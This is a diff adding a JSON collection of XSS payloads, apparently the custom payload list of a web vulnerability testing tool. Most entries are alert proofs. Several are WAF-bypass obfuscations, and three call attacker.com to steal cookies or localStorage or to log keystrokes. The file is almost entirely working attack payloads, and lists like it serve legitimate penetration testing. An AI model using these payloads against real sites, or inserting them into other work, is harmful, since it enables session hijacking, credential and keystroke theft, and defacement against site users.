@@ -1,0 +1,204 @@
+{
+  "custom_payloads": [
+    {
+      "name": "Basic Alert",
+      "description": "Simple alert payload for testing XSS vulnerabilities",
+      "context": "html",
+      "payload": "<script>alert('XSS')</script>",
+      "type": "alert",
+      "severity": "low",
+      "bypass_waf": false,
+      "tags": ["basic", "alert", "test"]
+    },
+    {
+      "name": "Image Onerror Alert",
+      "description": "XSS payload using image onerror event",
+      "context": "html",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "type": "alert",
+      "severity": "low",
+      "bypass_waf": false,
+      "tags": ["basic", "alert", "image", "event"]
+    },
+    {
+      "name": "SVG Onload Alert",
+      "description": "XSS payload using SVG onload event",
+      "context": "html",
+      "payload": "<svg onload=alert('XSS')>",
+      "type": "alert",
+      "severity": "low",
+      "bypass_waf": false,
+      "tags": ["basic", "alert", "svg", "event"]
+    },
+    {
+      "name": "JavaScript URL Alert",
+      "description": "XSS payload using JavaScript URL",
+      "context": "url",
+      "payload": "javascript:alert('XSS')",
+      "type": "alert",
+      "severity": "low",
+      "bypass_waf": false,
+      "tags": ["basic", "alert", "url"]
+    },
+    {
+      "name": "Event Handler Alert",
+      "description": "XSS payload using event handler",
+      "context": "html",
+      "payload": "<body onload=alert('XSS')>",
+      "type": "alert",
+      "severity": "low",
+      "bypass_waf": false,
+      "tags": ["basic", "alert", "event"]
+    },
+    {
+      "name": "Data Theft - Cookies",
+      "description": "XSS payload to steal cookies",
+      "context": "html",
+      "payload": "<script>fetch('https://attacker.com/steal?cookies='+encodeURIComponent(document.cookie))</script>",
+      "type": "data_theft",
+      "severity": "high",
+      "bypass_waf": false,
+      "tags": ["advanced", "data_theft", "cookies"]
+    },
+    {
+      "name": "Data Theft - LocalStorage",
+      "description": "XSS payload to steal localStorage data",
+      "context": "html",
+      "payload": "<script>fetch('https://attacker.com/steal?data='+encodeURIComponent(JSON.stringify(localStorage)))</script>",
+      "type": "data_theft",
+      "severity": "high",
+      "bypass_waf": false,
+      "tags": ["advanced", "data_theft", "localStorage"]
+    },
+    {
+      "name": "Keylogger",
+      "description": "XSS payload to implement a keylogger",
+      "context": "html",
+      "payload": "<script>document.addEventListener('keypress',function(e){fetch('https://attacker.com/log?key='+e.key)})</script>",
+      "type": "keylogger",
+      "severity": "critical",
+      "bypass_waf": false,
+      "tags": ["advanced", "keylogger"]
+    },
+    {
+      "name": "DOM Manipulation",
+      "description": "XSS payload to manipulate the DOM",
+      "context": "html",
+      "payload": "<script>document.body.innerHTML='<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;font-size:5em;text-align:center;padding-top:20%;\">Hacked!</div>'</script>",
+      "type": "dom_manipulation",
+      "severity": "medium",
+      "bypass_waf": false,
+      "tags": ["advanced", "dom_manipulation"]
+    },
+    {
+      "name": "WAF Bypass - Obfuscated Alert",
+      "description": "Obfuscated XSS payload to bypass WAF",
+      "context": "html",
+      "payload": "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
+      "type": "alert",
+      "severity": "medium",
+      "bypass_waf": true,
+      "tags": ["waf_bypass", "obfuscation", "alert"]
+    },
+    {
+      "name": "WAF Bypass - Unicode Encoding",
+      "description": "Unicode encoded XSS payload to bypass WAF",
+      "context": "html",
+      "payload": "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0027\\u0058\\u0053\\u0053\\u0027)</script>",
+      "type": "alert",
+      "severity": "medium",
+      "bypass_waf": true,
+      "tags": ["waf_bypass", "unicode", "alert"]
+    },
+    {
+      "name": "WAF Bypass - Template Literals",
+      "description": "XSS payload using template literals to bypass WAF",
+      "context": "javascript",
+      "payload": "eval(`alert\\x28'XSS'\\x29`)",
+      "type": "alert",
+      "severity": "medium",
+      "bypass_waf": true,
+      "tags": ["waf_bypass", "template_literals", "alert"]
+    },
+    {
+      "name": "WAF Bypass - Split Strings",
+      "description": "XSS payload using split strings to bypass WAF",
+      "context": "javascript",
+      "payload": "eval('al'+'ert'+'(\"X'+'SS\")')",
+      "type": "alert",
+      "severity": "medium",
+      "bypass_waf": true,
+      "tags": ["waf_bypass", "split_strings", "alert"]
+    },
+    {
+      "name": "DOM-based XSS - Location Hash",
+      "description": "DOM-based XSS payload using location.hash",
+      "context": "dom",
+      "payload": "<script>eval(location.hash.substr(1))</script>",
+      "type": "dom_based",
+      "severity": "high",
+      "bypass_waf": false,
+      "tags": ["dom_based", "location_hash"]
+    },
+    {
+      "name": "DOM-based XSS - Document Write",
+      "description": "DOM-based XSS payload using document.write",
+      "context": "dom",
+      "payload": "<script>document.write('<script>alert(\"XSS\")</script>')</script>",
+      "type": "dom_based",
+      "severity": "high",
+      "bypass_waf": false,
+      "tags": ["dom_based", "document_write"]
+    },
+    {
+      "name": "DOM-based XSS - innerHTML",
+      "description": "DOM-based XSS payload using innerHTML",
+      "context": "dom",
+      "payload": "<script>document.getElementById('target').innerHTML='<img src=x onerror=alert(\"XSS\")'></script>",
+      "type": "dom_based",
+      "severity": "high",
+      "bypass_waf": false,
+      "tags": ["dom_based", "innerHTML"]
+    },
+    {
+      "name": "Stored XSS - Profile Bio",
+      "description": "Stored XSS payload for profile bio fields",
+      "context": "html",
+      "payload": "<script>alert(document.cookie)</script>",
+      "type": "stored",
+      "severity": "critical",
+      "bypass_waf": false,
+      "tags": ["stored", "profile", "cookies"]
+    },
+    {
+      "name": "Stored XSS - Comment",
+      "description": "Stored XSS payload for comment fields",
+      "context": "html",
+      "payload": "<img src=x onerror=alert(document.cookie)>",
+      "type": "stored",
+      "severity": "critical",
+      "bypass_waf": false,
+      "tags": ["stored", "comment", "cookies"]
+    },
+    {
+      "name": "Reflected XSS - Search Parameter",
+      "description": "Reflected XSS payload for search parameters",
+      "context": "html",
+      "payload": "<script>alert(document.cookie)</script>",
+      "type": "reflected",
+      "severity": "high",
+      "bypass_waf": false,
+      "tags": ["reflected", "search", "cookies"]
+    },
+    {
+      "name": "Reflected XSS - URL Parameter",
+      "description": "Reflected XSS payload for URL parameters",
+      "context": "html",
+      "payload": "<img src=x onerror=alert(document.cookie)>",
+      "type": "reflected",
+      "severity": "high",
+      "bypass_waf": false,
+      "tags": ["reflected", "url", "cookies"]
+    }
+  ]
+}
